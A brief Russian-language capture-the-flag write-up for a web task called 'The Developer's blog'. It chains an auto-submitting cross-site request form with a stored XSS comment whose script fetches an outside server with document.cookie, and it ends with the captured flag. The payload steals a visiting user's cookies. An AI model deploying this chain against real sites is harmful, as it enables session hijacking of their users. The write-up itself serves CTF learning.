# The Developer's blog
В коментах под постами есть xss, но сообщения хранятся сериализованными в куках, а не на сервере.

Готовим страничку с пейлоадом index.html:
``` html
<html>
<body>
  <form action="http://79.143.25.24:1338/post/3" method="POST">
    <input type="hidden" name="name" value="lul">
    <input type="hidden" name="text" value="<script>fetch('http://194.28.155.252:4221/' + document.cookie)</script>">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```

Запускаем веб-сервер:
```bash
python -m http.server 4221
```

В форму фидбека отправляем ссылку на страницу с пейлоадом. "Сергей" переходит по ссылке, срабатывает скрипт и отправляет POST запрос с xss в комментарий под постом, после чего открывается страница с комментарием, где срабатывает второй скрипт. Он делает запрос на мой сервер вместе с cookie файлом, который содержит флаг.

Флаг - deteact{5dbc68e9f2c722747e9bb2aa7b33e658}